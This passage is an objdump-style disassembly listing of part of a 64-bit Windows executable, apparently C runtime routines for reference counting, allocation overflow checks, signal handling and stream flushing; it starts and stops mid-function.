   14000879d:	83 c8 ff             	or     $0xffffffff,%eax
   1400087a0:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   1400087a7:	00 
   1400087a8:	ff c8                	dec    %eax
   1400087aa:	c3                   	ret
   1400087ab:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   1400087b0:	c3                   	ret
   1400087b1:	cc                   	int3
   1400087b2:	cc                   	int3
   1400087b3:	cc                   	int3
   1400087b4:	48 83 ec 28          	sub    $0x28,%rsp
   1400087b8:	48 85 c9             	test   %rcx,%rcx
   1400087bb:	0f 84 96 00 00 00    	je     0x140008857
   1400087c1:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1400087c5:	f0 44 01 49 10       	lock add %r9d,0x10(%rcx)
   1400087ca:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   1400087d1:	48 85 c0             	test   %rax,%rax
   1400087d4:	74 04                	je     0x1400087da
   1400087d6:	f0 44 01 08          	lock add %r9d,(%rax)
   1400087da:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   1400087e1:	48 85 c0             	test   %rax,%rax
   1400087e4:	74 04                	je     0x1400087ea
   1400087e6:	f0 44 01 08          	lock add %r9d,(%rax)
   1400087ea:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   1400087f1:	48 85 c0             	test   %rax,%rax
   1400087f4:	74 04                	je     0x1400087fa
   1400087f6:	f0 44 01 08          	lock add %r9d,(%rax)
   1400087fa:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   140008801:	48 85 c0             	test   %rax,%rax
   140008804:	74 04                	je     0x14000880a
   140008806:	f0 44 01 08          	lock add %r9d,(%rax)
   14000880a:	48 8d 41 38          	lea    0x38(%rcx),%rax
   14000880e:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140008814:	48 8d 15 ad e9 00 00 	lea    0xe9ad(%rip),%rdx        # 0x1400171c8
   14000881b:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   14000881f:	74 0c                	je     0x14000882d
   140008821:	48 8b 10             	mov    (%rax),%rdx
   140008824:	48 85 d2             	test   %rdx,%rdx
   140008827:	74 04                	je     0x14000882d
   140008829:	f0 44 01 0a          	lock add %r9d,(%rdx)
   14000882d:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   140008832:	74 0d                	je     0x140008841
   140008834:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   140008838:	48 85 d2             	test   %rdx,%rdx
   14000883b:	74 04                	je     0x140008841
   14000883d:	f0 44 01 0a          	lock add %r9d,(%rdx)
   140008841:	48 83 c0 20          	add    $0x20,%rax
   140008845:	49 83 e8 01          	sub    $0x1,%r8
   140008849:	75 c9                	jne    0x140008814
   14000884b:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   140008852:	e8 35 ff ff ff       	call   0x14000878c
   140008857:	48 83 c4 28          	add    $0x28,%rsp
   14000885b:	c3                   	ret
   14000885c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008861:	57                   	push   %rdi
   140008862:	48 83 ec 20          	sub    $0x20,%rsp
   140008866:	e8 49 cb ff ff       	call   0x1400053b4
   14000886b:	48 8d b8 90 00 00 00 	lea    0x90(%rax),%rdi
   140008872:	8b 88 a8 03 00 00    	mov    0x3a8(%rax),%ecx
   140008878:	8b 05 32 ef 00 00    	mov    0xef32(%rip),%eax        # 0x1400177b0
   14000887e:	85 c8                	test   %ecx,%eax
   140008880:	74 08                	je     0x14000888a
   140008882:	48 8b 1f             	mov    (%rdi),%rbx
   140008885:	48 85 db             	test   %rbx,%rbx
   140008888:	75 2c                	jne    0x1400088b6
   14000888a:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000888f:	e8 94 d7 ff ff       	call   0x140006028
   140008894:	90                   	nop
   140008895:	48 8b 15 94 fc 00 00 	mov    0xfc94(%rip),%rdx        # 0x140018530
   14000889c:	48 8b cf             	mov    %rdi,%rcx
   14000889f:	e8 28 00 00 00       	call   0x1400088cc
   1400088a4:	48 8b d8             	mov    %rax,%rbx
   1400088a7:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400088ac:	e8 cb d7 ff ff       	call   0x14000607c
   1400088b1:	48 85 db             	test   %rbx,%rbx
   1400088b4:	74 0e                	je     0x1400088c4
   1400088b6:	48 8b c3             	mov    %rbx,%rax
   1400088b9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400088be:	48 83 c4 20          	add    $0x20,%rsp
   1400088c2:	5f                   	pop    %rdi
   1400088c3:	c3                   	ret
   1400088c4:	e8 57 c6 ff ff       	call   0x140004f20
   1400088c9:	90                   	nop
   1400088ca:	cc                   	int3
   1400088cb:	cc                   	int3
   1400088cc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400088d1:	57                   	push   %rdi
   1400088d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400088d6:	48 8b fa             	mov    %rdx,%rdi
   1400088d9:	48 85 d2             	test   %rdx,%rdx
   1400088dc:	74 46                	je     0x140008924
   1400088de:	48 85 c9             	test   %rcx,%rcx
   1400088e1:	74 41                	je     0x140008924
   1400088e3:	48 8b 19             	mov    (%rcx),%rbx
   1400088e6:	48 3b da             	cmp    %rdx,%rbx
   1400088e9:	75 05                	jne    0x1400088f0
   1400088eb:	48 8b c7             	mov    %rdi,%rax
   1400088ee:	eb 36                	jmp    0x140008926
   1400088f0:	48 89 39             	mov    %rdi,(%rcx)
   1400088f3:	48 8b cf             	mov    %rdi,%rcx
   1400088f6:	e8 2d fc ff ff       	call   0x140008528
   1400088fb:	48 85 db             	test   %rbx,%rbx
   1400088fe:	74 eb                	je     0x1400088eb
   140008900:	48 8b cb             	mov    %rbx,%rcx
   140008903:	e8 ac fe ff ff       	call   0x1400087b4
   140008908:	83 7b 10 00          	cmpl   $0x0,0x10(%rbx)
   14000890c:	75 dd                	jne    0x1400088eb
   14000890e:	48 8d 05 4b e7 00 00 	lea    0xe74b(%rip),%rax        # 0x140017060
   140008915:	48 3b d8             	cmp    %rax,%rbx
   140008918:	74 d1                	je     0x1400088eb
   14000891a:	48 8b cb             	mov    %rbx,%rcx
   14000891d:	e8 92 fc ff ff       	call   0x1400085b4
   140008922:	eb c7                	jmp    0x1400088eb
   140008924:	33 c0                	xor    %eax,%eax
   140008926:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000892b:	48 83 c4 20          	add    $0x20,%rsp
   14000892f:	5f                   	pop    %rdi
   140008930:	c3                   	ret
   140008931:	cc                   	int3
   140008932:	cc                   	int3
   140008933:	cc                   	int3
   140008934:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008939:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000893e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140008943:	57                   	push   %rdi
   140008944:	48 83 ec 20          	sub    $0x20,%rsp
   140008948:	49 8b e8             	mov    %r8,%rbp
   14000894b:	48 8b da             	mov    %rdx,%rbx
   14000894e:	48 8b f1             	mov    %rcx,%rsi
   140008951:	48 85 d2             	test   %rdx,%rdx
   140008954:	74 1d                	je     0x140008973
   140008956:	33 d2                	xor    %edx,%edx
   140008958:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   14000895c:	48 f7 f3             	div    %rbx
   14000895f:	49 3b c0             	cmp    %r8,%rax
   140008962:	73 0f                	jae    0x140008973
   140008964:	e8 27 d0 ff ff       	call   0x140005990
   140008969:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   14000896f:	33 c0                	xor    %eax,%eax
   140008971:	eb 41                	jmp    0x1400089b4
   140008973:	48 85 f6             	test   %rsi,%rsi
   140008976:	74 0a                	je     0x140008982
   140008978:	e8 2f 18 00 00       	call   0x14000a1ac
   14000897d:	48 8b f8             	mov    %rax,%rdi
   140008980:	eb 02                	jmp    0x140008984
   140008982:	33 ff                	xor    %edi,%edi
   140008984:	48 0f af dd          	imul   %rbp,%rbx
   140008988:	48 8b ce             	mov    %rsi,%rcx
   14000898b:	48 8b d3             	mov    %rbx,%rdx
   14000898e:	e8 55 18 00 00       	call   0x14000a1e8
   140008993:	48 8b f0             	mov    %rax,%rsi
   140008996:	48 85 c0             	test   %rax,%rax
   140008999:	74 16                	je     0x1400089b1
   14000899b:	48 3b fb             	cmp    %rbx,%rdi
   14000899e:	73 11                	jae    0x1400089b1
   1400089a0:	48 2b df             	sub    %rdi,%rbx
   1400089a3:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   1400089a7:	4c 8b c3             	mov    %rbx,%r8
   1400089aa:	33 d2                	xor    %edx,%edx
   1400089ac:	e8 6f 9f ff ff       	call   0x140002920
   1400089b1:	48 8b c6             	mov    %rsi,%rax
   1400089b4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400089b9:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400089be:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400089c3:	48 83 c4 20          	add    $0x20,%rsp
   1400089c7:	5f                   	pop    %rdi
   1400089c8:	c3                   	ret
   1400089c9:	cc                   	int3
   1400089ca:	cc                   	int3
   1400089cb:	cc                   	int3
   1400089cc:	48 83 ec 28          	sub    $0x28,%rsp
   1400089d0:	ff 15 72 48 00 00    	call   *0x4872(%rip)        # 0x14000d248
   1400089d6:	48 85 c0             	test   %rax,%rax
   1400089d9:	48 89 05 00 02 01 00 	mov    %rax,0x10200(%rip)        # 0x140018be0
   1400089e0:	0f 95 c0             	setne  %al
   1400089e3:	48 83 c4 28          	add    $0x28,%rsp
   1400089e7:	c3                   	ret
   1400089e8:	48 83 25 f0 01 01 00 	andq   $0x0,0x101f0(%rip)        # 0x140018be0
   1400089ef:	00 
   1400089f0:	b0 01                	mov    $0x1,%al
   1400089f2:	c3                   	ret
   1400089f3:	cc                   	int3
   1400089f4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400089f9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400089fe:	57                   	push   %rdi
   1400089ff:	48 83 ec 20          	sub    $0x20,%rsp
   140008a03:	48 8b f2             	mov    %rdx,%rsi
   140008a06:	48 8b f9             	mov    %rcx,%rdi
   140008a09:	48 3b ca             	cmp    %rdx,%rcx
   140008a0c:	74 54                	je     0x140008a62
   140008a0e:	48 8b d9             	mov    %rcx,%rbx
   140008a11:	48 8b 03             	mov    (%rbx),%rax
   140008a14:	48 85 c0             	test   %rax,%rax
   140008a17:	74 0a                	je     0x140008a23
   140008a19:	ff 15 69 48 00 00    	call   *0x4869(%rip)        # 0x14000d288
   140008a1f:	84 c0                	test   %al,%al
   140008a21:	74 09                	je     0x140008a2c
   140008a23:	48 83 c3 10          	add    $0x10,%rbx
   140008a27:	48 3b de             	cmp    %rsi,%rbx
   140008a2a:	75 e5                	jne    0x140008a11
   140008a2c:	48 3b de             	cmp    %rsi,%rbx
   140008a2f:	74 31                	je     0x140008a62
   140008a31:	48 3b df             	cmp    %rdi,%rbx
   140008a34:	74 28                	je     0x140008a5e
   140008a36:	48 83 c3 f8          	add    $0xfffffffffffffff8,%rbx
   140008a3a:	48 83 7b f8 00       	cmpq   $0x0,-0x8(%rbx)
   140008a3f:	74 10                	je     0x140008a51
   140008a41:	48 8b 03             	mov    (%rbx),%rax
   140008a44:	48 85 c0             	test   %rax,%rax
   140008a47:	74 08                	je     0x140008a51
   140008a49:	33 c9                	xor    %ecx,%ecx
   140008a4b:	ff 15 37 48 00 00    	call   *0x4837(%rip)        # 0x14000d288
   140008a51:	48 83 eb 10          	sub    $0x10,%rbx
   140008a55:	48 8d 43 08          	lea    0x8(%rbx),%rax
   140008a59:	48 3b c7             	cmp    %rdi,%rax
   140008a5c:	75 dc                	jne    0x140008a3a
   140008a5e:	32 c0                	xor    %al,%al
   140008a60:	eb 02                	jmp    0x140008a64
   140008a62:	b0 01                	mov    $0x1,%al
   140008a64:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008a69:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140008a6e:	48 83 c4 20          	add    $0x20,%rsp
   140008a72:	5f                   	pop    %rdi
   140008a73:	c3                   	ret
   140008a74:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008a79:	57                   	push   %rdi
   140008a7a:	48 83 ec 20          	sub    $0x20,%rsp
   140008a7e:	48 8b da             	mov    %rdx,%rbx
   140008a81:	48 8b f9             	mov    %rcx,%rdi
   140008a84:	48 3b ca             	cmp    %rdx,%rcx
   140008a87:	74 1a                	je     0x140008aa3
   140008a89:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   140008a8d:	48 85 c0             	test   %rax,%rax
   140008a90:	74 08                	je     0x140008a9a
   140008a92:	33 c9                	xor    %ecx,%ecx
   140008a94:	ff 15 ee 47 00 00    	call   *0x47ee(%rip)        # 0x14000d288
   140008a9a:	48 83 eb 10          	sub    $0x10,%rbx
   140008a9e:	48 3b df             	cmp    %rdi,%rbx
   140008aa1:	75 e6                	jne    0x140008a89
   140008aa3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008aa8:	b0 01                	mov    $0x1,%al
   140008aaa:	48 83 c4 20          	add    $0x20,%rsp
   140008aae:	5f                   	pop    %rdi
   140008aaf:	c3                   	ret
   140008ab0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008ab5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140008aba:	57                   	push   %rdi
   140008abb:	48 83 ec 20          	sub    $0x20,%rsp
   140008abf:	49 8b f9             	mov    %r9,%rdi
   140008ac2:	8b 0a                	mov    (%rdx),%ecx
   140008ac4:	e8 5f d5 ff ff       	call   0x140006028
   140008ac9:	90                   	nop
   140008aca:	48 8b 1d 2f e5 00 00 	mov    0xe52f(%rip),%rbx        # 0x140017000
   140008ad1:	8b cb                	mov    %ebx,%ecx
   140008ad3:	83 e1 3f             	and    $0x3f,%ecx
   140008ad6:	48 33 1d 1b 01 01 00 	xor    0x1011b(%rip),%rbx        # 0x140018bf8
   140008add:	48 d3 cb             	ror    %cl,%rbx
   140008ae0:	8b 0f                	mov    (%rdi),%ecx
   140008ae2:	e8 95 d5 ff ff       	call   0x14000607c
   140008ae7:	48 8b c3             	mov    %rbx,%rax
   140008aea:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008aef:	48 83 c4 20          	add    $0x20,%rsp
   140008af3:	5f                   	pop    %rdi
   140008af4:	c3                   	ret
   140008af5:	cc                   	int3
   140008af6:	cc                   	int3
   140008af7:	cc                   	int3
   140008af8:	4c 8b dc             	mov    %rsp,%r11
   140008afb:	48 83 ec 28          	sub    $0x28,%rsp
   140008aff:	b8 03 00 00 00       	mov    $0x3,%eax
   140008b04:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   140008b08:	4d 8d 43 08          	lea    0x8(%r11),%r8
   140008b0c:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140008b10:	49 8d 53 18          	lea    0x18(%r11),%rdx
   140008b14:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140008b18:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   140008b1c:	e8 8f ff ff ff       	call   0x140008ab0
   140008b21:	48 83 c4 28          	add    $0x28,%rsp
   140008b25:	c3                   	ret
   140008b26:	cc                   	int3
   140008b27:	cc                   	int3
   140008b28:	48 89 0d b9 00 01 00 	mov    %rcx,0x100b9(%rip)        # 0x140018be8
   140008b2f:	48 89 0d ba 00 01 00 	mov    %rcx,0x100ba(%rip)        # 0x140018bf0
   140008b36:	48 89 0d bb 00 01 00 	mov    %rcx,0x100bb(%rip)        # 0x140018bf8
   140008b3d:	48 89 0d bc 00 01 00 	mov    %rcx,0x100bc(%rip)        # 0x140018c00
   140008b44:	c3                   	ret
   140008b45:	cc                   	int3
   140008b46:	cc                   	int3
   140008b47:	cc                   	int3
   140008b48:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140008b4d:	56                   	push   %rsi
   140008b4e:	57                   	push   %rdi
   140008b4f:	41 54                	push   %r12
   140008b51:	41 55                	push   %r13
   140008b53:	41 56                	push   %r14
   140008b55:	48 83 ec 40          	sub    $0x40,%rsp
   140008b59:	8b d9                	mov    %ecx,%ebx
   140008b5b:	45 33 ed             	xor    %r13d,%r13d
   140008b5e:	44 21 6c 24 78       	and    %r13d,0x78(%rsp)
   140008b63:	41 b6 01             	mov    $0x1,%r14b
   140008b66:	44 88 74 24 70       	mov    %r14b,0x70(%rsp)
   140008b6b:	83 f9 02             	cmp    $0x2,%ecx
   140008b6e:	74 21                	je     0x140008b91
   140008b70:	83 f9 04             	cmp    $0x4,%ecx
   140008b73:	74 4c                	je     0x140008bc1
   140008b75:	83 f9 06             	cmp    $0x6,%ecx
   140008b78:	74 17                	je     0x140008b91
   140008b7a:	83 f9 08             	cmp    $0x8,%ecx
   140008b7d:	74 42                	je     0x140008bc1
   140008b7f:	83 f9 0b             	cmp    $0xb,%ecx
   140008b82:	74 3d                	je     0x140008bc1
   140008b84:	83 f9 0f             	cmp    $0xf,%ecx
   140008b87:	74 08                	je     0x140008b91
   140008b89:	8d 41 eb             	lea    -0x15(%rcx),%eax
   140008b8c:	83 f8 01             	cmp    $0x1,%eax
   140008b8f:	77 7d                	ja     0x140008c0e
   140008b91:	83 e9 02             	sub    $0x2,%ecx
   140008b94:	0f 84 af 00 00 00    	je     0x140008c49
   140008b9a:	83 e9 04             	sub    $0x4,%ecx
   140008b9d:	0f 84 8b 00 00 00    	je     0x140008c2e
   140008ba3:	83 e9 09             	sub    $0x9,%ecx
   140008ba6:	0f 84 94 00 00 00    	je     0x140008c40
   140008bac:	83 e9 06             	sub    $0x6,%ecx
   140008baf:	0f 84 82 00 00 00    	je     0x140008c37
   140008bb5:	83 f9 01             	cmp    $0x1,%ecx
   140008bb8:	74 74                	je     0x140008c2e
   140008bba:	33 ff                	xor    %edi,%edi
   140008bbc:	e9 8f 00 00 00       	jmp    0x140008c50
   140008bc1:	e8 6a c9 ff ff       	call   0x140005530
   140008bc6:	4c 8b e8             	mov    %rax,%r13
   140008bc9:	48 85 c0             	test   %rax,%rax
   140008bcc:	75 18                	jne    0x140008be6
   140008bce:	83 c8 ff             	or     $0xffffffff,%eax
   140008bd1:	48 8b 9c 24 88 00 00 	mov    0x88(%rsp),%rbx
   140008bd8:	00 
   140008bd9:	48 83 c4 40          	add    $0x40,%rsp
   140008bdd:	41 5e                	pop    %r14
   140008bdf:	41 5d                	pop    %r13
   140008be1:	41 5c                	pop    %r12
   140008be3:	5f                   	pop    %rdi
   140008be4:	5e                   	pop    %rsi
   140008be5:	c3                   	ret
   140008be6:	48 8b 00             	mov    (%rax),%rax
   140008be9:	48 8b 0d 10 58 00 00 	mov    0x5810(%rip),%rcx        # 0x14000e400
   140008bf0:	48 c1 e1 04          	shl    $0x4,%rcx
   140008bf4:	48 03 c8             	add    %rax,%rcx
   140008bf7:	eb 09                	jmp    0x140008c02
   140008bf9:	39 58 04             	cmp    %ebx,0x4(%rax)
   140008bfc:	74 0b                	je     0x140008c09
   140008bfe:	48 83 c0 10          	add    $0x10,%rax
   140008c02:	48 3b c1             	cmp    %rcx,%rax
   140008c05:	75 f2                	jne    0x140008bf9
   140008c07:	33 c0                	xor    %eax,%eax
   140008c09:	48 85 c0             	test   %rax,%rax
   140008c0c:	75 12                	jne    0x140008c20
   140008c0e:	e8 7d cd ff ff       	call   0x140005990
   140008c13:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140008c19:	e8 52 cc ff ff       	call   0x140005870
   140008c1e:	eb ae                	jmp    0x140008bce
   140008c20:	48 8d 78 08          	lea    0x8(%rax),%rdi
   140008c24:	45 32 f6             	xor    %r14b,%r14b
   140008c27:	44 88 74 24 70       	mov    %r14b,0x70(%rsp)
   140008c2c:	eb 22                	jmp    0x140008c50
   140008c2e:	48 8d 3d c3 ff 00 00 	lea    0xffc3(%rip),%rdi        # 0x140018bf8
   140008c35:	eb 19                	jmp    0x140008c50
   140008c37:	48 8d 3d b2 ff 00 00 	lea    0xffb2(%rip),%rdi        # 0x140018bf0
   140008c3e:	eb 10                	jmp    0x140008c50
   140008c40:	48 8d 3d b9 ff 00 00 	lea    0xffb9(%rip),%rdi        # 0x140018c00
   140008c47:	eb 07                	jmp    0x140008c50
   140008c49:	48 8d 3d 98 ff 00 00 	lea    0xff98(%rip),%rdi        # 0x140018be8
   140008c50:	48 83 a4 24 80 00 00 	andq   $0x0,0x80(%rsp)
   140008c57:	00 00 
   140008c59:	45 84 f6             	test   %r14b,%r14b
   140008c5c:	74 0b                	je     0x140008c69
   140008c5e:	b9 03 00 00 00       	mov    $0x3,%ecx
   140008c63:	e8 c0 d3 ff ff       	call   0x140006028
   140008c68:	90                   	nop
   140008c69:	48 8b 37             	mov    (%rdi),%rsi
   140008c6c:	45 84 f6             	test   %r14b,%r14b
   140008c6f:	74 12                	je     0x140008c83
   140008c71:	48 8b 05 88 e3 00 00 	mov    0xe388(%rip),%rax        # 0x140017000
   140008c78:	8b c8                	mov    %eax,%ecx
   140008c7a:	83 e1 3f             	and    $0x3f,%ecx
   140008c7d:	48 33 f0             	xor    %rax,%rsi
   140008c80:	48 d3 ce             	ror    %cl,%rsi
   140008c83:	48 83 fe 01          	cmp    $0x1,%rsi
   140008c87:	0f 84 94 00 00 00    	je     0x140008d21
   140008c8d:	48 85 f6             	test   %rsi,%rsi
   140008c90:	0f 84 03 01 00 00    	je     0x140008d99
   140008c96:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   140008c9c:	83 fb 0b             	cmp    $0xb,%ebx
   140008c9f:	77 3d                	ja     0x140008cde
   140008ca1:	41 0f a3 dc          	bt     %ebx,%r12d
   140008ca5:	73 37                	jae    0x140008cde
   140008ca7:	49 8b 45 08          	mov    0x8(%r13),%rax
   140008cab:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140008cb2:	00 
   140008cb3:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140008cb8:	49 83 65 08 00       	andq   $0x0,0x8(%r13)
   140008cbd:	83 fb 08             	cmp    $0x8,%ebx
   140008cc0:	75 53                	jne    0x140008d15
   140008cc2:	e8 ed c6 ff ff       	call   0x1400053b4
   140008cc7:	8b 40 10             	mov    0x10(%rax),%eax
   140008cca:	89 44 24 78          	mov    %eax,0x78(%rsp)
   140008cce:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140008cd2:	e8 dd c6 ff ff       	call   0x1400053b4
   140008cd7:	c7 40 10 8c 00 00 00 	movl   $0x8c,0x10(%rax)
   140008cde:	83 fb 08             	cmp    $0x8,%ebx
   140008ce1:	75 32                	jne    0x140008d15
   140008ce3:	48 8b 05 1e 57 00 00 	mov    0x571e(%rip),%rax        # 0x14000e408
   140008cea:	48 c1 e0 04          	shl    $0x4,%rax
   140008cee:	49 03 45 00          	add    0x0(%r13),%rax
   140008cf2:	48 8b 0d 17 57 00 00 	mov    0x5717(%rip),%rcx        # 0x14000e410
   140008cf9:	48 c1 e1 04          	shl    $0x4,%rcx
   140008cfd:	48 03 c8             	add    %rax,%rcx
   140008d00:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140008d05:	48 3b c1             	cmp    %rcx,%rax
   140008d08:	74 1d                	je     0x140008d27
   140008d0a:	48 83 60 08 00       	andq   $0x0,0x8(%rax)
   140008d0f:	48 83 c0 10          	add    $0x10,%rax
   140008d13:	eb eb                	jmp    0x140008d00
   140008d15:	48 8b 05 e4 e2 00 00 	mov    0xe2e4(%rip),%rax        # 0x140017000
   140008d1c:	48 89 07             	mov    %rax,(%rdi)
   140008d1f:	eb 06                	jmp    0x140008d27
   140008d21:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   140008d27:	45 84 f6             	test   %r14b,%r14b
   140008d2a:	74 0a                	je     0x140008d36
   140008d2c:	b9 03 00 00 00       	mov    $0x3,%ecx
   140008d31:	e8 46 d3 ff ff       	call   0x14000607c
   140008d36:	48 83 fe 01          	cmp    $0x1,%rsi
   140008d3a:	75 07                	jne    0x140008d43
   140008d3c:	33 c0                	xor    %eax,%eax
   140008d3e:	e9 8e fe ff ff       	jmp    0x140008bd1
   140008d43:	83 fb 08             	cmp    $0x8,%ebx
   140008d46:	75 19                	jne    0x140008d61
   140008d48:	e8 67 c6 ff ff       	call   0x1400053b4
   140008d4d:	8b 50 10             	mov    0x10(%rax),%edx
   140008d50:	8b cb                	mov    %ebx,%ecx
   140008d52:	48 8b c6             	mov    %rsi,%rax
   140008d55:	4c 8b 05 2c 45 00 00 	mov    0x452c(%rip),%r8        # 0x14000d288
   140008d5c:	41 ff d0             	call   *%r8
   140008d5f:	eb 0e                	jmp    0x140008d6f
   140008d61:	8b cb                	mov    %ebx,%ecx
   140008d63:	48 8b c6             	mov    %rsi,%rax
   140008d66:	48 8b 15 1b 45 00 00 	mov    0x451b(%rip),%rdx        # 0x14000d288
   140008d6d:	ff d2                	call   *%rdx
   140008d6f:	83 fb 0b             	cmp    $0xb,%ebx
   140008d72:	77 c8                	ja     0x140008d3c
   140008d74:	41 0f a3 dc          	bt     %ebx,%r12d
   140008d78:	73 c2                	jae    0x140008d3c
   140008d7a:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140008d81:	00 
   140008d82:	49 89 45 08          	mov    %rax,0x8(%r13)
   140008d86:	83 fb 08             	cmp    $0x8,%ebx
   140008d89:	75 b1                	jne    0x140008d3c
   140008d8b:	e8 24 c6 ff ff       	call   0x1400053b4
   140008d90:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   140008d94:	89 48 10             	mov    %ecx,0x10(%rax)
   140008d97:	eb a3                	jmp    0x140008d3c
   140008d99:	45 84 f6             	test   %r14b,%r14b
   140008d9c:	74 08                	je     0x140008da6
   140008d9e:	8d 4e 03             	lea    0x3(%rsi),%ecx
   140008da1:	e8 d6 d2 ff ff       	call   0x14000607c
   140008da6:	b9 03 00 00 00       	mov    $0x3,%ecx
   140008dab:	e8 80 b9 ff ff       	call   0x140004730
   140008db0:	90                   	nop
   140008db1:	cc                   	int3
   140008db2:	cc                   	int3
   140008db3:	cc                   	int3
   140008db4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008db9:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140008dbe:	57                   	push   %rdi
   140008dbf:	48 83 ec 20          	sub    $0x20,%rsp
   140008dc3:	49 8b f9             	mov    %r9,%rdi
   140008dc6:	49 8b d8             	mov    %r8,%rbx
   140008dc9:	48 8b 0a             	mov    (%rdx),%rcx
   140008dcc:	e8 0b 04 00 00       	call   0x1400091dc
   140008dd1:	90                   	nop
   140008dd2:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   140008dd6:	48 8b 03             	mov    (%rbx),%rax
   140008dd9:	48 8b 00             	mov    (%rax),%rax
   140008ddc:	48 85 c0             	test   %rax,%rax
   140008ddf:	74 5a                	je     0x140008e3b
   140008de1:	8b 48 14             	mov    0x14(%rax),%ecx
   140008de4:	8b c1                	mov    %ecx,%eax
   140008de6:	c1 e8 0d             	shr    $0xd,%eax
   140008de9:	a8 01                	test   $0x1,%al
   140008deb:	74 4e                	je     0x140008e3b
   140008ded:	8b c1                	mov    %ecx,%eax
   140008def:	24 03                	and    $0x3,%al
   140008df1:	3c 02                	cmp    $0x2,%al
   140008df3:	75 05                	jne    0x140008dfa
   140008df5:	f6 c1 c0             	test   $0xc0,%cl
   140008df8:	75 0a                	jne    0x140008e04
   140008dfa:	0f ba e1 0b          	bt     $0xb,%ecx
   140008dfe:	72 04                	jb     0x140008e04
   140008e00:	ff 02                	incl   (%rdx)
   140008e02:	eb 37                	jmp    0x140008e3b
   140008e04:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140008e08:	80 38 00             	cmpb   $0x0,(%rax)
   140008e0b:	75 0f                	jne    0x140008e1c
   140008e0d:	48 8b 03             	mov    (%rbx),%rax
   140008e10:	48 8b 08             	mov    (%rax),%rcx
   140008e13:	8b 41 14             	mov    0x14(%rcx),%eax
   140008e16:	d1 e8                	shr    $1,%eax
   140008e18:	a8 01                	test   $0x1,%al
   140008e1a:	74 1f                	je     0x140008e3b
   140008e1c:	48 8b 03             	mov    (%rbx),%rax
   140008e1f:	48 8b 08             	mov    (%rax),%rcx
   140008e22:	e8 e5 01 00 00       	call   0x14000900c
   140008e27:	83 f8 ff             	cmp    $0xffffffff,%eax
   140008e2a:	74 08                	je     0x140008e34
   140008e2c:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140008e30:	ff 00                	incl   (%rax)
   140008e32:	eb 07                	jmp    0x140008e3b
   140008e34:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140008e38:	83 08 ff             	orl    $0xffffffff,(%rax)
   140008e3b:	48 8b 0f             	mov    (%rdi),%rcx
   140008e3e:	e8 a5 03 00 00       	call   0x1400091e8
   140008e43:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008e48:	48 83 c4 20          	add    $0x20,%rsp
   140008e4c:	5f                   	pop    %rdi
   140008e4d:	c3                   	ret
   140008e4e:	cc                   	int3
   140008e4f:	cc                   	int3
   140008e50:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008e55:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140008e5a:	56                   	push   %rsi
   140008e5b:	57                   	push   %rdi
   140008e5c:	41 56                	push   %r14
   140008e5e:	48 83 ec 60          	sub    $0x60,%rsp
   140008e62:	49 8b f1             	mov    %r9,%rsi
   140008e65:	49 8b f8             	mov    %r8,%rdi
   140008e68:	8b 0a                	mov    (%rdx),%ecx
